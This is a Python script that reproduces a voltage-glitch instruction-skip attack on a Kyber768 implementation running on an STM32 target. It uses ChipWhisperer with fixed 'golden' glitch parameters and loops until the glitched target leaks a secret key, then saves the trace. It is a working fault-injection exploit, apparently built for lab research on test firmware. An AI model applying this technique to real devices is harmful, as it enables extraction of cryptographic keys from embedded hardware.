#!/usr/bin/env python3
"""
Kyber768 Instruction Skip Attack Reproduction
Golden Parameters: ext_offset=17, width=4, offset=-12
"""

import chipwhisperer as cw
import time
import numpy as np
import os

# Configuration
FW_PATH = "bin/test_glitch.hex"

def setup_scope_and_target():
    """Initialize ChipWhisperer with verified working settings"""
    print("Connecting to ChipWhisperer...")
    try:
        scope = cw.scope()
        target = cw.target(scope)
    except Exception as e:
        print(f"Connection failed: {e}")
        return None, None
    
    # Standard setup
    scope.default_setup()
    
    # Clock settings (from run_sanity.py - verified working)
    scope.clock.clkgen_freq = 7372800
    scope.clock.adc_src = "clkgen_x4"
    
    # Serial configuration
    scope.io.tio1 = "serial_rx"
    scope.io.tio2 = "serial_tx"
    scope.trigger.triggers = "tio4"
    target.baud = 38400
    
    # Glitch settings for voltage glitch
    scope.glitch.clk_src = "clkgen"
    scope.glitch.output = "enable_only"  # Voltage glitch mode
    scope.glitch.trigger_src = "ext_single"
    scope.io.glitch_lp = True
    scope.io.glitch_hp = True
    
    # Golden parameters
    scope.glitch.ext_offset = 17
    scope.glitch.width = 4
    scope.glitch.offset = -12
    scope.glitch.repeat = 1
    
    return scope, target

def read_until(target, term, timeout_ms=2000):
    """Read from target until term is found or timeout"""
    result = ""
    start = time.time()
    while (time.time() - start) * 1000 < timeout_ms:
        if target.in_waiting():
            data = target.read()
            result += data
            if term in result:
                return result
        time.sleep(0.01)
    return result if result else None

def reset_target(scope, target):
    """Reset target and wait for boot"""
    scope.io.nrst = 'low'
    time.sleep(0.1)
    scope.io.nrst = 'high'
    time.sleep(0.5)
    target.flush()

def main():
    scope, target = setup_scope_and_target()
    if not scope:
        return
    
    # Program target
    print(f"Programming {FW_PATH}...")
    try:
        cw.program_target(scope, cw.programmers.STM32FProgrammer, FW_PATH)
        print("Programming successful!")
    except Exception as e:
        print(f"Programming failed: {e}")
        print("Please power-cycle the board and try again.")
        scope.dis()
        return
    
    # Reset and wait for init
    reset_target(scope, target)
    
    print("Waiting for target initialization...")
    
    # Read all output for 5 seconds to get complete boot sequence
    all_output = ""
    start_time = time.time()
    while time.time() - start_time < 5:
        if target.in_waiting():
            all_output += target.read()
        time.sleep(0.05)
    
    print(f"Boot output:\n{all_output}")
    
    if "KEYS GENERATED" not in all_output:
        print("Target did not initialize. Check connections.")
        scope.dis()
        target.dis()
        return
    
    # Extract target key from GOLD: line
    # Format is: "GOLD: \n35d934868bccb952...\n"
    TARGET_KEY = None
    if "GOLD: " in all_output:
        idx = all_output.index("GOLD: ") + 6
        # Skip any whitespace/newlines to find the actual key
        remaining = all_output[idx:].strip()
        # The key is the first word/line
        TARGET_KEY = remaining.split()[0] if remaining else None
        print(f"Target Key: {TARGET_KEY}")
    
    if not TARGET_KEY or len(TARGET_KEY) < 32:
        print(f"Invalid target key: {TARGET_KEY}")
        scope.dis()
        target.dis()
        return
    
    # Create output directory
    os.makedirs("traces_repro", exist_ok=True)
    
    print("\n" + "="*50)
    print("ATTACK PARAMETERS")
    print("="*50)
    print(f"ext_offset = {scope.glitch.ext_offset}")
    print(f"width      = {scope.glitch.width}")
    print(f"offset     = {scope.glitch.offset}")
    print(f"repeat     = {scope.glitch.repeat}")
    print(f"output     = {scope.glitch.output}")
    print("="*50)
    print("\nStarting attack loop (max 10000 attempts)...")
    
    total = 0
    crashes = 0
    successes = 0
    max_attempts = 10000
    
    while successes == 0 and total < max_attempts:
        target.flush()
        
        # Wait for WAIT signal
        msg = read_until(target, "WAIT", 500)
        if not msg or "WAIT" not in msg:
            crashes += 1
            if crashes % 10 == 0:
                reset_target(scope, target)
                read_until(target, "WAIT", 2000)
            continue
        
        # Arm and capture
        scope.arm()
        ret = scope.capture()
        
        if ret:
            crashes += 1
            if crashes % 10 == 0:
                reset_target(scope, target)
            continue
        
        # Read result
        resp = read_until(target, "\n", 500)
        
        if resp and TARGET_KEY in resp:
            successes += 1
            print(f"\n\n{'='*50}")
            print("[SUCCESS] INSTRUCTION SKIP CONFIRMED!")
            print(f"{'='*50}")
            print(f"Attempt: {total}")
            print(f"Crashes: {crashes}")
            print(f"Key: {TARGET_KEY}")
            print(f"{'='*50}")
            
            # Save trace
            trace = scope.get_last_trace()
            np.save("traces_repro/golden_success.npy", trace)
            print("Trace saved to traces_repro/golden_success.npy")
            break
        
        total += 1
        if total % 100 == 0:
            rate = crashes / total * 100 if total > 0 else 0
            print(f"Attempt {total}, Crashes: {crashes} ({rate:.1f}%)", end="\r")
    
    if successes == 0:
        print(f"\nNo success after {total} attempts ({crashes} crashes).")
        print("Consider widening the parameter search range.")
    
    scope.dis()
    target.dis()

if __name__ == "__main__":
    main()
